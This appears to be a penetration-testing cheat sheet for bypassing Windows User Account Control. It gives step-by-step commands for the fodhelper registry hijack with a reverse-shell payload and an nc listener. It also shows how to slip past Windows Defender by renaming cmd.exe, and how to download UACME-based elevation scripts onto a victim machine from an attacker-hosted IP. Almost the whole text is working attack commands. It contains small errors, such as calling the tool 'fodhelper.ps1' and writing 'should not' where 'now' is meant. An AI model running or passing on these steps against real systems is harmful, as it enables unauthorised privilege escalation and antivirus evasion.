# Intro
## Test if a UAC Bypass will be Needed
- To start off, first list your groups and check if you're in the Local Administrators group:

```
net user {your user name}
```

- If you're part of the Local Administrators group, try to do some Administrative tasks, like creating a new user:

```
net user dave2 dave2 /add
```

- If the user was created successfully, you should not need to do a UAC Bypass. If you are faced with the message "Access is denied", you will need to do a UAC Bypass.
- You can also confirm by checking your integrity level in the current CMD session:

```
whoami /groups
```

- All the way at the bottom of the output, it will either say "Mandatory Label\\Medium Mandatory Level" or "Mandatory Label\\High Mandatory Level". 
- If your integrity level is "Medium", you will need to do a UAC Bypass.

# Using Fodhelper.ps1
## Disabled Windows Defender
- Windows 10 introduced a new tool called `fodhelper.ps1` which exists in C:\\Windows\\System32. We can abuse this tool for UAC Bypassing. 
- First, we need to make sure we're in Powershell. Simply type `powershell` in the command prompt if you're not already in a Powershell session:

```
powershell
```

- Next, we'll need to create a Registry structure to setup for the UAC Bypass. First, we create a new Item:

```
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
```

- Then, we add a new property to the item:

```
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
```

- Now we set the value of the property to the program we want to execute. This can be a reverse shell script generated by `msfvenom`, a Powershell Base-64 encoded payload, or something else:

```
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "{Path\To\File or payload itself}" -Force
```

- Before executing the payload, make sure you have a listener on Kali to catch the reverse shell connection:

> [!important]
> The listener may need to be on another port if it interferes with the currently existing reverse shell connection.

```
┌──(kali㉿kali)-[~/CTF]
└─$ nc -nvlp 443
```

- And finally, we execute the bypass:

```
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

- Now let's verify the integrity level:

```
whoami /groups
```

- The integrity level should not be set to "High".
- To clean up, let's delete the Registry structure we created:

```
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

- That's it! You should now have a successful UAC Bypass.
## Enabled Windows Defender
- If Windows Defender is enabled with all defensive settings turned on, the third Registry structure command (`Set-ItemProperty`) will most likely get detected and blocked. To mitigate this, you need to look at the program passed to `-Value`.
- If you are simply passing `cmd.exe` to the parameter, a very easy way to bypass the defenses is by copying `cmd.exe` to a new location with a new name:

```
copy C:\Windows\System32\cmd.exe C:\Users\Public\lolgetrekt.exe
```

- Now, simply pass this new path to the command:

```
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Users\Public\lolgetrekt.exe" -Force
```

--- 

- If you're instead using a reverse shell script that's getting detected, check it's code to see if it's trying to execute `cmd.exe` or `powershell.exe`. If so, simply apply the same logic and modify the code to execute the program at a new location with a new name.
- Take the following example script:

```
...
blahblah(cmd.exe)
...
```

- We could modify this script to execute a copy of `cmd.exe` that we renamed instead of executing the orignal `cmd.exe` itself:

```
...
blahblah("C:\Users\Public\lolgetrekt.exe")
...
```

- This should be able to slip by Windows Defender without an issue. 

# Using UACME Binaries
- A developer has made some binaries of the UACME Bypass tool called [Bypass-UAC](https://github.com/ScriptKiddieTutorials/Bypass-UAC) for easy download and use. 
- First, let's download it and set it up:

```
┌──(kali㉿kali)-[~/CTF]
└─$ cd /opt

┌──(kali㉿kali)-[/opt]
└─$ sudo mkdir UACBypass; cd UACBypass

┌──(kali㉿kali)-[/opt]
└─$ sudo git clone https://github.com/ScriptKiddieTutorials/Bypass-UAC.git; sudo mv Bypass-UAC/powershell/elev.ps1 elev.ps1; sudo mv Bypass-UAC/batch/elev.bat elev.bat; sudo mv Bypass-UAC/python/elev.py elev.py; sudo rm -rf Bypass-UAC

┌──(kali㉿kali)-[/opt]
└─$ cd ~/CTF
```

- Now that it's setup, let's use it. Simply download it from the victim machine (make sure you're in Powershell):

```
iwr -uri http://{ip}/elev.ps1 -Outfile lolgetrekt.ps1
```

- And finally, run it:

```
.\elev.ps1
```

